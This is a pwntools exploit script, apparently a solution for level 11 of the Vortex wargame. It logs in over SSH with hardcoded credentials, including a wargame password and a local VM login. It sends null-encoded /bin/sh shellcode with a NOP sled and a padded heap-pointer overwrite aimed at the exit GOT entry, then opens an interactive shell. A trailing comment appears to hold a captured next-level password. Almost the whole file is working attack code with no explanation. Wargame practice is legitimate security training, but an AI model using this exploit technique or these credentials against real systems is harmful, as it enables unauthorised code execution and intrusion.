from pwn import *
from random import randint
from time import sleep
import time


local_dir = None
remote_binary = None
local_binary = None
local_libc = None
libc = None
port = None
elf = None

BINARY_PATH = None
CWD = None
LOCAL = None


def pad(s, slen):
    return s+b"B"*(slen-len(s))


def connect(level, password,init=True):
    global remote_binary
    global local_dir
    global local_binary
    global port
    global libc
    global elf
    global CWD
    global BINARY_PATH
    global LOCAL
    compose_downloaded_files(level)
    port = 2228
    connected = False
    s = None
    while not connected:
        try:
            s = ssh("vortex"+level, "176.9.9.172", password=password, cache=True, port=port)
            connected = True
            log.info("connected")
            if init:
                s.libs(remote_binary, local_dir)
        except Exception as e:
            log.info("ssh connection attempt failed")
            print("error: {0}".format(e))
            sleep(randint(1, 5))
    log.info(f"cloned_binary: {local_binary}")
    elf = ELF(local_binary)
    libc = ELF(local_libc)
    context.clear()
    context.binary = local_binary
    context.log_file = "/tmp/docgillog"
    VM = False
    CWD = "/tmp/"
    BINARY_PATH = "/vortex/vortex"+level
    return s


def pad(s, slen):
    return s+b"B"*(slen-len(s))


# function of local testing vm
def connect_to_vm(level, password, remote=True):
    global CWD
    global LOCAL
    global BINARY_PATH
    if remote:
        connect(level, password)
    else:
        compose_downloaded_files(level)
    context.clear()
    context.binary = local_binary
    context.log_file = "/tmp/docgillog"
    s = ssh("gil", "192.168.2.177", password="gil123", cache=True)
    CWD = "/vortex/"+level
    BINARY_PATH = "/vortex/vortex" + level
    # BINARY_PATH = "/vortex/6/dir/vortex6"
    # BINARY_PATH = "dir/vortex6"
    s.upload(local_binary, BINARY_PATH)
    s.process(["mkdir", "/vortex/"+level])
    s.upload(local_libc, "/vortex/"+level+"/libc.so.6")
    s.process(["chmod", "a+x", BINARY_PATH])
    VM = True
    return s
    # only useful to replace libc, if we need gadgets from it, then upload and use LD_PRELOAD
    # s.upload(local_libc, "/lib/x86_64-linux-gnu/libc.so.6")


def compose_downloaded_files(level):
    global remote_binary
    global local_dir
    global local_binary
    global port
    global libc
    global elf
    global local_libc
    local_dir = "/home/kali/PycharmProjects/vortex/" + level
    remote_binary = "/vortex/vortex" + level
    local_binary = local_dir + remote_binary
    local_libc = local_dir + "/lib32/libc.so.6"


s = connect("11", "%8sLEszy9")
# s = connect_to_vm("11", "%8sLEszy9", remote=False)
exit_got = 0x804c028
# avoid nullbyte
shellcode_adr = 0x804e800 + 20

off_until_page_member = 2052


payload = b""
payload += asm(pwnlib.shellcraft.i386.nop()) * 40
payload += pwnlib.encoders.encoder.null(asm(pwnlib.shellcraft.i386.sh()))
payload = pad(payload, off_until_page_member)
# overwrite page from pginfo struct
payload += pack(exit_got - 0x40, 32)

io = None
if LOCAL:
    io = s.process([BINARY_PATH, payload, pack(shellcode_adr)], env={"LD_PRELOAD": "/vortex/11/libc.so.6"})
else:
    io = s.process([BINARY_PATH, payload, pack(shellcode_adr)])

io.interactive()

# nKV95q]dx


